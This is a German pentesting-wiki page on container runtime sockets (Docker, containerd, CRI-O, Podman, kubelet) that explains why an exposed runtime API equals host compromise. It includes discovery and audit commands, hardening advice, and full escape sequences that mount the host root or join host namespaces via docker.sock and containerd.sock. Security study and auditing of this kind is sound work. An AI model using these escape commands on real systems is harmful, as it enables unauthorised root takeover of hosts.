# Laufzeit-API und Daemon-Offenlegung

{{#include ../../../banners/hacktricks-training.md}}

## Überblick

Viele reale Container-Kompromittierungen beginnen überhaupt nicht mit einem Namespace-Escape. Sie beginnen mit dem Zugriff auf die Runtime-Control-Plane. Wenn eine Workload mit `dockerd`, `containerd`, CRI-O, Podman oder kubelet über einen eingehängten Unix-Socket oder einen exponierten TCP-Listener kommunizieren kann, kann ein Angreifer möglicherweise einen neuen Container mit höheren Rechten anfordern, das Host-Dateisystem mounten, Host-Namespaces beitreten oder sensible Node-Informationen abrufen. In solchen Fällen ist die Runtime-API die eigentliche Sicherheitsgrenze, und ihre Kompromittierung ist funktional nahe an einer Kompromittierung des Hosts.

Deshalb sollte die Offenlegung von Runtime-Sockets getrennt von Kernel-Schutzmaßnahmen dokumentiert werden. Ein Container mit normalen seccomp-, capabilities- und MAC-Einschränkungen kann trotzdem nur einen API-Aufruf von einer Host-Kompromittierung entfernt sein, wenn `/var/run/docker.sock` oder `/run/containerd/containerd.sock` darin gemountet ist. Die Kernel-Isolierung des aktuellen Containers kann genau wie vorgesehen funktionieren, während die Runtime-Management-Ebene vollständig exponiert bleibt.

## Daemon-Zugriffsmodelle

Docker Engine stellt seine privilegierte API traditionell über den lokalen Unix-Socket `unix:///var/run/docker.sock` bereit. Historisch wurde sie auch remote über TCP-Listener wie `tcp://0.0.0.0:2375` oder einen TLS-geschützten Listener auf `2376` exponiert. Das Remote-Offenlegen des Daemons ohne starke TLS- und Client-Authentifizierung verwandelt die Docker-API effektiv in eine Remote-root-Schnittstelle.

containerd, CRI-O, Podman und kubelet bieten ähnliche hochkritische Angriffsflächen. Die Namen und Workflows unterscheiden sich, aber die Logik nicht. Wenn die Schnittstelle dem Aufrufer erlaubt, Workloads zu erstellen, Host-Pfade zu mounten, Credentials abzurufen oder laufende Container zu verändern, ist die Schnittstelle ein privilegierter Management-Kanal und sollte entsprechend behandelt werden.

Gängige lokale Pfade, die überprüft werden sollten, sind:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Ältere oder spezialisiertere Stacks können auch Endpunkte wie `dockershim.sock`, `frakti.sock` oder `rktlet.sock` exponieren. Diese sind in modernen Umgebungen weniger verbreitet, sollten aber bei Auftreten mit derselben Vorsicht behandelt werden, da sie Laufzeit-Kontrolloberflächen darstellen und keine gewöhnlichen Anwendungssockets sind.

## Sicherer Fernzugriff

Wenn ein Daemon über die lokale Socket hinaus exponiert werden muss, sollte die Verbindung mit TLS geschützt und idealerweise durch gegenseitige Authentifizierung abgesichert werden, sodass der Daemon den Client und der Client den Daemon verifiziert. Die veraltete Gewohnheit, den Docker daemon aus Bequemlichkeit über reines HTTP zu öffnen, ist einer der gefährlichsten Fehler in der Container-Verwaltung, da die API-Oberfläche mächtig genug ist, um privilegierte Container direkt zu erstellen.

Das historische Docker-Konfigurationsmuster sah folgendermaßen aus:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Auf systemd-basierten Hosts kann die Daemon-Kommunikation auch als `fd://` erscheinen, was bedeutet, dass der Prozess einen von systemd vorgeöffneten Socket erbt, anstatt ihn selbst direkt zu binden. Wichtig ist nicht die genaue Syntax, sondern die sicherheitsrelevante Konsequenz. Sobald der Daemon über einen streng beschränkten lokalen Socket hinaus lauscht, werden Transportsicherheit und Client-Authentifizierung verpflichtend statt optionale Härtungsmaßnahmen.

## Missbrauch

Wenn ein Runtime-Socket vorhanden ist, prüfen Sie, welcher es ist, ob ein kompatibler Client existiert und ob direkter HTTP- oder gRPC-Zugriff möglich ist:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Diese Befehle sind nützlich, weil sie zwischen einem toten Pfad, einem gemounteten, aber unzugänglichen Socket und einer aktiven, privilegierten API unterscheiden. Wenn der Client erfolgreich ist, stellt sich als Nächstes die Frage, ob die API einen neuen Container starten kann, der das Root-Dateisystem des Hosts per bind mount einhängt oder Host-Namespace-Sharing verwendet.

### Vollständiges Beispiel: Docker Socket To Host Root

Wenn `docker.sock` erreichbar ist, besteht der klassische Escape darin, einen neuen Container zu starten, der das Root-Dateisystem des Hosts einhängt, und dann mittels `chroot` hineinzuwechseln:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Dies ermöglicht direkte host-root-Ausführung über den Docker daemon. Die Auswirkungen beschränken sich nicht nur auf Datei-Lesezugriffe. Sobald sich der Angreifer im neuen container befindet, kann er Host-Dateien verändern, Zugangsdaten auslesen, Persistenz implementieren oder zusätzliche privilegierte Workloads starten.

### Vollständiges Beispiel: Docker Socket To Host Namespaces

Wenn der Angreifer Namespace-Eintritt anstelle von filesystem-only access bevorzugt:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Dieser Pfad erreicht den Host, indem er die runtime auffordert, einen neuen Container mit expliziter host-namespace exposure zu erstellen, anstatt den aktuellen auszunutzen.

### Vollständiges Beispiel: containerd Socket

Ein eingebundener `containerd`-Socket ist normalerweise genauso gefährlich:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Die Auswirkung ist erneut eine Kompromittierung des Hosts. Selbst wenn Docker-spezifische Tools fehlen, kann eine andere Runtime-API dieselbe administrative Macht bieten.

## Prüfungen

Ziel dieser Prüfungen ist es zu beantworten, ob der Container irgendeine Management-Plane erreichen kann, die außerhalb der Vertrauensgrenze hätte bleiben sollen.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Was hier interessant ist:

- Ein eingebundener Runtime-Socket ist in der Regel ein direktes administratives Primitive und keine bloße Informationsoffenlegung.
- Ein TCP-Listener auf `2375` ohne TLS sollte als Indiz für eine Remote-Kompromittierung betrachtet werden.
- Umgebungsvariablen wie `DOCKER_HOST` zeigen oft, dass die Workload absichtlich dafür ausgelegt wurde, mit der Host-Runtime zu kommunizieren.

## Standardverhalten der Runtime

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig ein lokaler Unix-Socket | `dockerd` lauscht am lokalen Socket und der Daemon läuft üblicherweise mit root-Rechten | Einbinden von `/var/run/docker.sock`, Exponieren von `tcp://...:2375`, schwaches oder fehlendes TLS auf `2376` |
| Podman | Standardmäßig daemonlose CLI | Für die normale lokale Nutzung ist kein lang laufender privilegierter Daemon erforderlich; API-Sockets können jedoch exponiert werden, wenn `podman system service` aktiviert ist | Exponieren von `podman.sock`, den Dienst breit ausführen, root-privilegierte API-Nutzung |
| containerd | Lokaler privilegierter Socket | Administrative API über den lokalen Socket exponiert und üblicherweise von höherstufigen Tools genutzt | Einbinden von `containerd.sock`, weitreichender `ctr`- oder `nerdctl`-Zugriff, Exponieren privilegierter Namespaces |
| CRI-O | Lokaler privilegierter Socket | Der CRI-Endpunkt ist für node-lokale vertrauenswürdige Komponenten gedacht | Einbinden von `crio.sock`, Exponieren des CRI-Endpunkts für nicht vertrauenswürdige Workloads |
| Kubernetes kubelet | Node-lokale Management-API | Der kubelet sollte von Pods aus nicht breit erreichbar sein; Zugriff kann Pod-Status, Credentials und Ausführungsfunktionen offenlegen, abhängig von authn/authz | Einbinden von kubelet-Sockets oder Zertifikaten, schwaches kubelet-auth, Host-Netzwerkmodus plus erreichbarer kubelet-Endpunkt |
{{#include ../../../banners/hacktricks-training.md}}
